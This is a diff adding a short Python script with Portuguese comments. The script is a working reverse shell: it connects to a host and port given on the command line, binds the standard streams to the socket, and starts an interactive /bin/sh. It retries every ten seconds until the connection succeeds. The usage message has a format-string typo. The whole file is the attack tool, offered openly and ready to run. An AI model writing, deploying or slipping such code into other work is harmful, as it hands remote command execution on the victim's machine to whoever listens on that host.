@@ -1,0 +1,25 @@
+import socket
+import subprocess
+import time
+import sys
+import os
+
+if len(sys.argv) != 3:                                    # Confere se o número de argumentos passados está correto
+  print("usage: s% <hostname> <port>"%sys.argv[0])        # Mostra um help para o usuário
+  sys.exit(0)                                             # Finaliza o programa
+
+host = str(sys.argv[1])                                   # Endereço doservidor
+port = int(sys.argv[2])                                   # Porta do servidor
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)      # Socket TCP da família IPV4
+
+while True:
+  try:
+    s.connect((host,port))                                # Tenta uma conexão com o servidor
+    os.dup2(s.fileno(),0)                                 # Copia o stdin para o descritor do socket
+    os.dup2(s.fileno(),1)                                 # Copia o stdout para o descritor do socket
+    os.dup2(s.fileno(),2)                                 # Copia o stderr para o descritor do socket
+    subprocess.call(["/bin/sh","-i"])                     # Executa o shell
+    
+  except socket.error:
+    time.sleep(10)                                        # Espera 10 segundos caso haja um erro na conexão
